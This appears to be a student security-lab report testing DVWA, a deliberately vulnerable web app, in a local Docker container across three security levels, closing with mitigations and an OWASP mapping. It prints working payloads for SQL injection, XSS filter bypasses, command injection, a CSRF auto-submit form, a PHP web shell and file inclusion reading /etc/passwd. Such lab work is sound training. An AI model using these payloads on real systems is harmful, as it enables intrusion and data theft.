# DVWA Security Lab Report

## Application Security Testing Lab

---

# 1. Environment Setup

## 1.1 Install Docker

Verify installation:

```bash
docker --version
```

Output:

```bash
Docker version 29.2.1
```

---

# 2. Deploy DVWA in Docker

## Pull DVWA Image

```bash
docker pull vulnerables/web-dvwa
```

## Run DVWA Container

```bash
docker run -d \
--name dvwa \
-p 8080:80 \
vulnerables/web-dvwa
```

## Verify Container

```bash
docker ps
```

Output:

```bash
CONTAINER ID   IMAGE                  COMMAND      CREATED         STATUS         PORTS                                     NAMES
94f3c45d157b   vulnerables/web-dvwa   "/main.sh"   3 minutes ago   Up 3 minutes   0.0.0.0:8080->80/tcp, [::]:8080->80/tcp   dvwa
```

---

Open in browser:

```
http://localhost:8080
```
---

# 3. Vulnerability Testing

Security levels tested:

* Low
* Medium
* High

---

# 3.1 SQL Injection

## Security Level: Low

Payload Used:

```
1' OR '1'='1
```

Result:

All user records were displayed.

Screenshot:

![SQL Injection Low](images/sql/low.png)


Explanation:

At the Low security level, user input is directly inserted into the SQL query without input validation or sanitization. The payload modifies the SQL query logic so the condition always evaluates to true.

Query:

```sql
SELECT * FROM users WHERE id='1' OR '1'='1';
```

This causes the database to return all records.

---

## Security Level: Medium

Payload Used:

```
1/2/3/4/5
```

Result:

User records were still displayed.

Screenshot:

![SQL Injection Low](images/sql/medium.png)

Explanation:

The Medium level uses `mysql_real_escape_string()` to escape quotes and special characters. However, the input parameter is numeric and not enclosed in quotes in the SQL query. Because of this, escaping does not prevent SQL manipulation.

The query remains vulnerable because the developer relied only on input escaping rather than parameterized queries.

---

## Security Level: High

Payload Used:

```
a' UNION SELECT "test1","test2";-- -
```

Result:

Custom values appeared in the result.

Screenshot:

![SQL Injection Low](images/sql/high.png)

Explanation:

The High security level introduces additional checks such as session validation. However, the SQL query is still constructed dynamically and does not use prepared statements. This allows attackers to use UNION-based SQL injection to modify the query result and inject custom values.

---

# 3.2 Reflected XSS

## Security Level: Low

Payload Used:

```
<script>alert('XSS')</script>
```

Result:

A JavaScript alert popup appeared.

Screenshot:

![SQL Injection Low](images/xss_reflected/low.png)

Explanation:

At the Low security level, user input is reflected directly in the web page without sanitization. Because the input is inserted into the HTML output, the browser interprets it as executable JavaScript.

---

## Security Level: Medium

Payload Used:

```
<ScRiPt>alert("XSS")</ScRiPt>
```

Result:

Alert popup appeared.

Screenshot:

![SQL Injection Low](images/xss_reflected/medium.png)

Explanation:

The Medium level attempts to filter `<script>` tags, but the filter is case-sensitive. By changing the letter casing of the tag, the attacker bypasses the filter and executes JavaScript.

---

## Security Level: High

Payload Used:

```
<img src="invalid.jpg" onerror="alert(1)">
```

Result:

Alert popup appeared.

Screenshot:

![SQL Injection Low](images/xss_reflected/high.png)

Explanation:

The filter removes `<script>` tags but does not sanitize HTML event attributes such as `onerror`. By injecting an image element with an event handler, JavaScript execution is triggered when the image fails to load.

---

# 3.3 Stored XSS

## Security Level: Low

Payload Used:

Name:

```
Muskan
```

Message:

```
<script>alert('Stored XSS')</script>
```

Result:

The alert appeared every time the page reloaded.

Screenshot:

![SQL Injection Low](images/xss_stored/low.png)

Explanation:

The application stores user input directly in the database without sanitization. When the page loads, the stored script executes automatically.

---

## Security Level: Medium

Payload Used:

```
<sCriPt>alert("XSS");</sCriPt>
```

Result:

Alert appeared.

Screenshot:

![SQL Injection Low](images/xss_stored/medium.png)

Explanation:

The Medium level introduces partial filtering, but not all fields are protected. The Name field does not properly sanitize input, allowing JavaScript code to be stored and executed.

---

## Security Level: High

Payload Used:

```
</div><img src=x onerror=alert(1)>
```

Result:

The payload did not execute JavaScript.

Explanation:

At the High security level, the application performs stronger input filtering and output encoding. Dangerous attributes are removed and special characters are encoded. Because of this, the browser treats the input as plain text rather than executable JavaScript.

---

# 3.4 Command Injection

## Security Level: Low

Payload Used:

```
127.0.0.1 && dir
```

Result:

The directory listing was displayed after the ping command executed.

Screenshot:

![SQL Injection Low](images/command_injection/low.png)

Explanation:

The application executes system commands directly using user input. By appending `&&`, attackers can run additional commands after the original command completes.

---

## Security Level: Medium

Payload Used:

```
127.0.0.1 & dir
```

Result:

The ping command ran in the background and the directory listing was displayed.

Screenshot:

![SQL Injection Low](images/command_injection/medium.png)

Explanation:

Some command operators are filtered, but the background operator `&` is not blocked. This allows attackers to execute additional commands.

---

## Security Level: High

Payload Used:

```
127.0.0.1|dir
```

Result:

Both ping output and directory listing were displayed.

Screenshot:

![SQL Injection Low](images/command_injection/high.png)

Explanation:

The developer attempted to filter input using pattern matching and `trim()`. However, `trim()` only removes whitespace from the beginning and end of the input. Removing spaces around the pipe operator allows the attacker to bypass the filter.

---

# 3.5 Blind SQL Injection

## Security Level: Low

Payload Used:

```
1' AND 1=1#
```

Result:

The message **"User ID exists in the database"** appeared.

Screenshot:

![SQL Injection Low](images/sql_blind/low.png)

Explanation:

At the Low level, user input is directly inserted into the SQL query without validation. Logical conditions such as `AND 1=1` allow attackers to manipulate the query and confirm vulnerabilities.

---

## Security Level: Medium

Payload Used:

```
1
```

Result:

User ID exists in the database.

Screenshot:

![SQL Injection Low](images/sql_blind/medium.png)

Explanation:

The Medium level uses `mysql_real_escape_string()` but does not enclose the parameter in quotes. Because the value is numeric, escaping does not protect the query from manipulation.

---

## Security Level: High

Payload Used:

```
1' AND SLEEP(5)#
```

Result:

The webpage response was delayed by approximately 5 seconds.

Screenshot:

![SQL Injection Low](images/sql_blind/hard.png)

Explanation:

Although database errors are hidden, injected SQL commands are still executed. Using the `SLEEP()` function creates a delay, allowing attackers to confirm the vulnerability through timing differences.

---

# 3.6 JavaScript Attacks

## Security Level: Low

Payload Used:

```
success + generate_token()
```

Result:

Token updated and validation succeeded.

Screenshot:

![SQL Injection Low](images/JavaScript/low.png)

Explanation:

Token generation is implemented entirely in client-side JavaScript. By analyzing and manually executing the token function in the browser console, attackers can bypass validation.

---

## Security Level: Medium

Payload Used:

```
do_elsesomething("XX")
```

Result:

Token regenerated successfully.

Screenshot:

![SQL Injection Low](images/JavaScript/medium.png)

Explanation:

Token generation still occurs in client-side JavaScript. Attackers can execute the required functions manually in the console to generate valid tokens.

---

## Security Level: High

Result:

Token could not be regenerated manually.

Explanation:

Token validation is moved to the server side. Since the browser no longer controls token generation, manually executing JavaScript functions cannot bypass the validation mechanism.

---

# 3.7 Brute Force

## Security Level: Low

Payload Used:

```
admin : password
```

Result:

Login successful.

Screenshot:

![SQL Injection Low](images/brute_force/low.png)

Explanation:

There are no protections such as rate limiting, CAPTCHA, or account lockout. Attackers can attempt unlimited login combinations.

---

## Security Level: Medium

Payload Used:

```
admin : password
```

Result:

Login successful.

Screenshot:

![SQL Injection Low](images/brute_force/medium.png)

Explanation:

A delay is introduced after failed login attempts. This slows brute force attacks but does not prevent them.

---

## Security Level: High

Payload Used:

```
admin : password
```

Result:

Authentication successful.

Screenshot:

![SQL Injection Low](images/brute_force/high.png)

Explanation:

Additional protections such as CSRF tokens are implemented. However, weak credentials still allow attackers to gain access once discovered.

---
# 3.8 CSRF (Cross-Site Request Forgery)

## Security Level: Low

Payload Used:

```html
<html>
<body onload="document.forms[0].submit()">

<form action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
<input type="hidden" name="password_new" value="hacked">
<input type="hidden" name="password_conf" value="hacked">
<input type="hidden" name="Change" value="Change">
</form>

</body>
</html>
```

Result:

The attack worked successfully and the password was changed.

Screenshot:

![CSRF Low](images/csrf/low.png)

Explanation:

At the Low security level, DVWA does not check where the request is coming from. Because of this, the malicious HTML page was able to send a request to the server and change the password while the user was logged in. Since there is no validation, the server accepts the request and performs the action.

---

## Security Level: Medium

Payload Used:

The same payload used in the Low security level was tested again.

Result:

The attack initially failed when the HTML file was opened locally. After hosting the file using a local web server, the request worked because the referer appeared to come from localhost.

Screenshot:

![CSRF Medium](images/csrf/medium.png)

Explanation:

At the Medium security level, DVWA checks the HTTP Referer header. This means the application tries to verify that the request is coming from the same website. When the attack page was opened locally, the referer header was missing so the request failed. When the malicious page was hosted on a local server, the referer contained localhost, which allowed the request to bypass the check. This shows that using only the referer header is weak protection.

---

## Security Level: High

Payload Used:

The same payload was tested again but without including a valid CSRF token as it changes every session and is generated dynamically.

Result:

The attack failed and the password was not changed.

Screenshot:

![CSRF High](images/csrf/high.png)

Explanation:

At the High security level, DVWA uses a CSRF token called user_token. This token is generated by the server and must be included in the request. Since the malicious request did not contain the correct token, the server rejected the request and the attack failed.

---

# 3.9 File Upload

File upload vulnerabilities occur when a web application allows users to upload files without properly validating them.

## Security Level: Low

Payload Used:

```
shell.php
```

Content of the uploaded file:

```php
<?php
echo "File upload successful";
system($_GET['cmd']);
?>
```

Result:

The file uploaded successfully and the PHP code executed when the file was opened in the browser.

Screenshot:

![File Upload Low](images/file_upload/low.png)

Explanation:

At the Low security level, the application does not check the file type or extension. Because of this, a malicious PHP file can be uploaded directly. When the uploaded file is accessed through the browser, the PHP code runs on the server.

---

## Security Level: Medium

Payload Used:

```
shell.php.jpg
```

Result:

The file was successfully uploaded even though it contained PHP code.

Screenshot:

![File Upload Medium](images/file_upload/medium.png)

Explanation:

At the Medium security level, the application tries to restrict uploads by checking the file extension. However, this protection is weak. By using a double extension such as .php.jpg, the application thinks the file is an image and allows the upload.

---

## Security Level: High

Payload Used:

```
shell.php
shell.php.jpg
shell.php5
shell.phtml
```

Result:

The upload was blocked and the malicious file could not be uploaded.

Screenshot:

![File Upload High](images/file_upload/high.png)

Explanation:

At the High security level, stronger validation is applied. The application checks the file type and verifies whether the uploaded file is a real image. Because the uploaded file contained PHP code instead of image data, the server rejected it.

---

# 3.10 Weak Session IDs

Weak Session IDs occur when a web application generates session identifiers that are predictable.

## Security Level: Low

Payload Used:

Generated session IDs using DVWA’s Generate button and observed session values from browser cookies.

Result:

The session IDs were sequential integers:

```
1, 2, 3, 4, 5
```

This allows an attacker to easily predict the next session ID and hijack a session.

Screenshot:

![Weak Session IDs Low](images/weak_session/low.png)

Explanation:

At Low security, DVWA generates session IDs as incrementing integers, making them fully predictable. An attacker can guess the next ID and hijack a session.

---

## Security Level: Medium

Payload Used:

Generated session IDs at Medium level and observed cookies.

Result:

The session IDs were based on Unix timestamps:

```
1699443834
1699443835
1699443836
```

These could be guessed if the attacker knew approximately when the session was created.

Screenshot:

![Weak Session IDs Medium](images/weak_session/medium.png)

Explanation:

At Medium security, DVWA uses timestamps to generate session IDs. While less predictable than sequential integers, an attacker can still estimate session IDs based on the current time.

---

## Security Level: High

Payload Used:

Generated session IDs at High level and observed cookies.

Result:

The session IDs were long random hash values:

```
7c4a8d09ca3762af61e59520943dc264
```

Screenshot:

![Weak Session IDs High](images/weak_session/high.png)

Explanation:

At High security, DVWA generates session IDs using MD5 hashes. While this increases unpredictability, MD5 is considered cryptographically weak and modern applications should use secure random generators.

---

# 3.11 DOM Based Cross-Site Scripting (DOM XSS)

## Security Level: Low

Payload Used:

```
<script>alert('XSS')</script>
```

Result:

An alert popup appeared in the browser.

Screenshot:

![DOM XSS Low](images/DOM_xss/low.png)

Explanation:

At the Low security level, the application directly inserts user input into the page using JavaScript without sanitization, allowing script execution.

---

## Security Level: Medium

Payload Used:

```
<img src=x onerror=alert(1)>
```

Result:

The alert popup appeared.

Screenshot:

![DOM XSS Medium](images/DOM_xss/medium.png)

Explanation:

The application blocks script tags but does not remove HTML event attributes such as onerror, which allows JavaScript execution.

---

## Security Level: High

Payload Used:

```
<img src=x onerror=alert(1)>
```

Result:

The alert popup still appeared.

Screenshot:

![DOM XSS High](images/DOM_xss/high.png)

Explanation:

The application uses blacklist filtering that blocks certain tags but not event handlers like onerror, allowing the payload to bypass the filter.

---

# 3.12 Content Security Policy (CSP) Bypass

## Security Level: Low

Payload Used:

```
http://127.0.0.1:8000/evil.js
```

Content of evil.js:

```javascript
alert("CSP Bypass Successful");
```

Result:

The alert popup appeared in the browser.

Screenshot:

![CSP Low](images/csp/low.png)

Explanation:

The CSP configuration does not properly restrict script sources, allowing external malicious scripts to execute.

---

## Security Level: Medium

Payload Used:

```
http://127.0.0.1:8000/evil.js
```

Result:

The alert popup appeared again when the script was loaded.

Screenshot:

![CSP Medium](images/csp/medium.png)

Explanation:

Scripts from localhost are allowed, enabling the malicious script hosted on the local machine to bypass the policy.

---

## Security Level: High

Payload Used:

```
http://localhost:8080/vulnerabilities/csp/source/jsonp.php?callback=alert
```

Result:

The alert appeared in the browser.

Screenshot:

![CSP High](images/csp/high.png)

Explanation:

The CSP policy restricts scripts to the same origin. However, a JSONP endpoint allows a callback parameter that returns executable JavaScript, bypassing the protection.

---

# 3.13 File Inclusion

## Security Level: Low

Payload Used:

```
http://localhost:8080/vulnerabilities/fi/?page=file4.php
```

Result:

The application successfully loaded file4.php.

Screenshot:

![File Inclusion Low](images/file_inclusion/low.png)

Explanation:

DVWA directly loads the file specified in the page parameter without validating the file name, allowing attackers to access unintended files.

---

## Security Level: Medium

Payload Used:

```
http://localhost:8080/vulnerabilities/fi/?page=//etc/passwd
```

Result:

The contents of the /etc/passwd file were displayed.

Screenshot:

![File Inclusion Medium](images/file_inclusion/medium.png)

Explanation:

The application attempts to block directory traversal patterns but does not account for alternative path formats, allowing access to system files.

---

## Security Level: High

Payload Used:

```
http://localhost:8080/vulnerabilities/fi/?page=file:////etc/passwd
```

Result:

The application displayed the contents of the /etc/passwd file.

Screenshot:

![File Inclusion High](images/file_inclusion/high.png)

Explanation:

Although additional validation is implemented, the application does not properly validate URI schemes. Using the file:// protocol bypasses the filter and allows sensitive files to be included.


# 4. Docker Inspection Tasks


```bash
docker ps
```

Output: 
```bash
CONTAINER ID   IMAGE                  COMMAND      CREATED      STATUS          PORTS                                     NAMES
94f3c45d157b   vulnerables/web-dvwa   "/main.sh"   2 days ago   Up 11 seconds   0.0.0.0:8080->80/tcp, [::]:8080->80/tcp   dvwa
```
---

```bash
docker inspect dvwa
```
Output:
```bash
[
    {
        "Id": "94f3c45d157bfd78ef049253ba3c9f2b5572e2aa3b954c08960aab2b4d92dbfe",
        "Created": "2026-03-07T09:04:02.91400642Z",
        "Path": "/main.sh",
        "Args": [],
        "State": {
            "Status": "running",
            "Running": true,
            "Paused": false,
            "Restarting": false,
            "OOMKilled": false,
            "Dead": false,
            "Pid": 421,
            "ExitCode": 0,
            "Error": "",
            "StartedAt": "2026-03-10T04:33:40.016095069Z",
            "FinishedAt": "2026-03-10T04:31:08.2097005Z"
        },
        "Image": "sha256:dae203fe11646a86937bf04db0079adef295f426da68a92b40e3b181f337daa7",
        "ResolvConfPath": "/var/lib/docker/containers/94f3c45d157bfd78ef049253ba3c9f2b5572e2aa3b954c08960aab2b4d92dbfe/resolv.conf",
        "HostnamePath": "/var/lib/docker/containers/94f3c45d157bfd78ef049253ba3c9f2b5572e2aa3b954c08960aab2b4d92dbfe/hostname",
        "HostsPath": "/var/lib/docker/containers/94f3c45d157bfd78ef049253ba3c9f2b5572e2aa3b954c08960aab2b4d92dbfe/hosts",
        "LogPath": "/var/lib/docker/containers/94f3c45d157bfd78ef049253ba3c9f2b5572e2aa3b954c08960aab2b4d92dbfe/94f3c45d157bfd78ef049253ba3c9f2b5572e2aa3b954c08960aab2b4d92dbfe-json.log",
        "Name": "/dvwa",
        "RestartCount": 0,
        "Driver": "overlayfs",
        "Platform": "linux",
        "MountLabel": "",
        "ProcessLabel": "",
        "AppArmorProfile": "",
        "ExecIDs": null,
        "HostConfig": {
            "Binds": null,
            "ContainerIDFile": "",
            "LogConfig": {
                "Type": "json-file",
                "Config": {}
            },
            "NetworkMode": "bridge",
            "PortBindings": {
                "80/tcp": [
                    {
                        "HostIp": "",
                        "HostPort": "8080"
                    }
                ]
            },
            "RestartPolicy": {
                "Name": "no",
                "MaximumRetryCount": 0
            },
            "AutoRemove": false,
            "VolumeDriver": "",
            "VolumesFrom": null,
            "ConsoleSize": [
                28,
                120
            ],
            "CapAdd": null,
            "CapDrop": null,
            "CgroupnsMode": "private",
            "Dns": [],
            "DnsOptions": [],
            "DnsSearch": [],
            "ExtraHosts": null,
            "GroupAdd": null,
            "IpcMode": "private",
            "Cgroup": "",
            "Links": null,
            "OomScoreAdj": 0,
            "PidMode": "",
            "Privileged": false,
            "PublishAllPorts": false,
            "ReadonlyRootfs": false,
            "SecurityOpt": null,
            "UTSMode": "",
            "UsernsMode": "",
            "ShmSize": 67108864,
            "Runtime": "runc",
            "Isolation": "",
            "CpuShares": 0,
            "Memory": 0,
            "NanoCpus": 0,
            "CgroupParent": "",
            "BlkioWeight": 0,
            "BlkioWeightDevice": [],
            "BlkioDeviceReadBps": [],
            "BlkioDeviceWriteBps": [],
            "BlkioDeviceReadIOps": [],
            "BlkioDeviceWriteIOps": [],
            "CpuPeriod": 0,
            "CpuQuota": 0,
            "CpuRealtimePeriod": 0,
            "CpuRealtimeRuntime": 0,
            "CpusetCpus": "",
            "CpusetMems": "",
            "Devices": [],
            "DeviceCgroupRules": null,
            "DeviceRequests": null,
            "MemoryReservation": 0,
            "MemorySwap": 0,
            "MemorySwappiness": null,
            "OomKillDisable": null,
            "PidsLimit": null,
            "Ulimits": [],
            "CpuCount": 0,
            "CpuPercent": 0,
            "IOMaximumIOps": 0,
            "IOMaximumBandwidth": 0,
            "MaskedPaths": [
                "/proc/acpi",
                "/proc/asound",
                "/proc/interrupts",
                "/proc/kcore",
                "/proc/keys",
                "/proc/latency_stats",
                "/proc/sched_debug",
                "/proc/scsi",
                "/proc/timer_list",
                "/proc/timer_stats",
                "/sys/devices/virtual/powercap",
                "/sys/firmware"
            ],
            "ReadonlyPaths": [
                "/proc/bus",
                "/proc/fs",
                "/proc/irq",
                "/proc/sys",
                "/proc/sysrq-trigger"
            ]
        },
        "Storage": {
            "RootFS": {
                "Snapshot": {
                    "Name": "overlayfs"
                }
            }
        },
        "Mounts": [],
        "Config": {
            "Hostname": "94f3c45d157b",
            "Domainname": "",
            "User": "",
            "AttachStdin": false,
            "AttachStdout": false,
            "AttachStderr": false,
            "ExposedPorts": {
                "80/tcp": {}
            },
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
            ],
            "Cmd": null,
            "Image": "vulnerables/web-dvwa",
            "Volumes": null,
            "WorkingDir": "",
            "Entrypoint": [
                "/main.sh"
            ],
            "Labels": {
                "maintainer": "opsxcq@strm.sh"
            },
            "StopTimeout": 1
        },
        "NetworkSettings": {
            "SandboxID": "2d0616aa1102b8a8285302980fc9bdecc449158adc283d290dafa4eae3939b98",
            "SandboxKey": "/var/run/docker/netns/2d0616aa1102",
            "Ports": {
                "80/tcp": [
                    {
                        "HostIp": "0.0.0.0",
                        "HostPort": "8080"
                    },
                    {
                        "HostIp": "::",
                        "HostPort": "8080"
                    }
                ]
            },
            "Networks": {
                "bridge": {
                    "IPAMConfig": null,
                    "Links": null,
                    "Aliases": null,
                    "DriverOpts": null,
                    "GwPriority": 0,
                    "NetworkID": "d365a3da2196a3c580213cd712ccd0966deb2e1875da9aafe9e4acfadca9c8b4",
                    "EndpointID": "7e623b0d83c8f952f9631174ae989fde0f05df968a04da1105147907299d1a18",
                    "Gateway": "172.17.0.1",
                    "IPAddress": "172.17.0.2",
                    "MacAddress": "e2:81:8d:5d:88:2a",
                    "IPPrefixLen": 16,
                    "IPv6Gateway": "",
                    "GlobalIPv6Address": "",
                    "GlobalIPv6PrefixLen": 0,
                    "DNSNames": null
                }
            }
        },
        "ImageManifestDescriptor": {
            "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
            "digest": "sha256:dae203fe11646a86937bf04db0079adef295f426da68a92b40e3b181f337daa7",
            "size": 1997,
            "platform": {
                "architecture": "amd64",
                "os": "linux"
            }
        }
    }
]
```
---

```bash
docker logs dvwa
```
Output:

```bash
[+] Starting mysql...
Starting MariaDB database server: mysqld.
[+] Starting apache
AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message
Starting Apache httpd web server: apache2.
==> /var/log/apache2/access.log <==

==> /var/log/apache2/error.log <==
[Sat Mar 07 09:04:05.733803 2026] [mpm_prefork:notice] [pid 284] AH00163: Apache/2.4.25 (Debian) configured -- resuming normal operations
[Sat Mar 07 09:04:05.734071 2026] [core:notice] [pid 284] AH00094: Command line: '/usr/sbin/apache2'

==> /var/log/apache2/other_vhosts_access.log <==

==> /var/log/apache2/access.log <==
172.17.0.1 - - [07/Mar/2026:09:07:54 +0000] "GET / HTTP/1.1" 302 479 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
172.17.0.1 - - [07/Mar/2026:09:07:54 +0000] "GET /login.php HTTP/1.1" 200 1049 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
172.17.0.1 - - [07/Mar/2026:09:07:54 +0000] "GET /dvwa/css/login.css HTTP/1.1" 200 741 "http://localhost:8080/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
172.17.0.1 - - [07/Mar/2026:09:07:54 +0000] "GET /dvwa/images/login_logo.png HTTP/1.1" 200 9374 "http://localhost:8080/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
172.17.0.1 - - [07/Mar/2026:09:07:54 +0000] "GET /favicon.ico HTTP/1.1" 200 1706 "http://localhost:8080/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
172.17.0.1 - - [07/Mar/2026:09:08:19 +0000] "POST /login.php HTTP/1.1" 302 337 "http://localhost:8080/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
172.17.0.1 - - [07/Mar/2026:09:08:19 +0000] "GET /setup.php HTTP/1.1" 200 2042 "http://localhost:8080/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
172.17.0.1 - - [07/Mar/2026:09:08:19 +0000] "GET /dvwa/css/main.css HTTP/1.1" 200 1445 "http://localhost:8080/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
172.17.0.1 - - [07/Mar/2026:09:08:19 +0000] "GET /dvwa/js/dvwaPage.js HTTP/1.1" 200 816 "http://localhost:8080/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
172.17.0.1 - - [07/Mar/2026:09:08:19 +0000] "GET /dvwa/images/spanner.png HTTP/1.1" 200 748 "http://localhost:8080/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
172.17.0.1 - - [07/Mar/2026:09:08:19 +0000] "GET /dvwa/images/logo.png HTTP/1.1" 200 5331 "http://localhost:8080/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
172.17.0.1 - - [07/Mar/2026:09:08:19 +0000] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 200 625 "http://localhost:8080/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
172.17.0.1 - - [07/Mar/2026:09:09:11 +0000] "POST /setup.php HTTP/1.1" 302 338 "http://localhost:8080/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
172.17.0.1 - - [07/Mar/2026:09:09:11 +0000] "GET /setup.php HTTP/1.1" 200 2179 "http://localhost:8080/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"

```
---
```bash
docker exec -it dvwa /bin/bash
ls /var/www/html
```
Output:
```bash
CHANGELOG.md  about.php  dvwa         hackable     instructions.php  php.ini      security.php
COPYING.txt   config     external     ids_log.php  login.php         phpinfo.php  setup.php
README.md     docs       favicon.ico  index.php    logout.php        robots.txt   vulnerabilities
```
---
## Where Application Files Are Stored

Application files are located in:

```
/var/www/html
```

This is the default web root directory used by Apache web servers.

---

## Backend Technology Used

DVWA uses:

* PHP for server-side logic
* MySQL database
* Apache web server

---

## How Docker Provides Isolation

Docker isolates the DVWA environment by running it inside a container. The container includes its own filesystem, dependencies, and runtime environment. This prevents the vulnerable application from affecting the host system and allows safe testing.

---

# 5. Security Analysis

## Why SQL Injection Succeeds at Low Security

At the Low security level, user input is inserted directly into SQL queries without validation or sanitization. Because the application dynamically constructs SQL queries, attackers can modify the query logic.

---

## What Control Prevents It at High Security

The most effective control is the use of **prepared statements (parameterized queries)**. These separate SQL code from user input, preventing injected commands from being executed.

---

## Does HTTPS Prevent These Attacks?

No.

HTTPS encrypts data during transmission but does not prevent vulnerabilities such as SQL injection or cross-site scripting. These attacks exploit weaknesses in server-side application logic rather than network communication.

---

## Risks if the Application is Publicly Accessible

If deployed publicly, attackers could:

* Steal sensitive data
* Execute malicious scripts
* Gain unauthorized system access
* Modify or delete database records
* Compromise user accounts

---

# 6. OWASP Top 10 Mapping

| Vulnerability       | OWASP Category                                  |
| ------------------- | ----------------------------------------------- |
| SQL Injection       | A03: Injection                                  |
| Blind SQL Injection | A03: Injection                                  |
| Command Injection   | A03: Injection                                  |
| Reflected XSS       | A03: Injection                                  |
| Stored XSS          | A03: Injection                                  |
| Brute Force         | A07: Identification and Authentication Failures |
| JavaScript Attacks  | A05: Security Misconfiguration                  |

These vulnerabilities demonstrate common weaknesses described in the **OWASP Foundation Top 10 security risks.

---

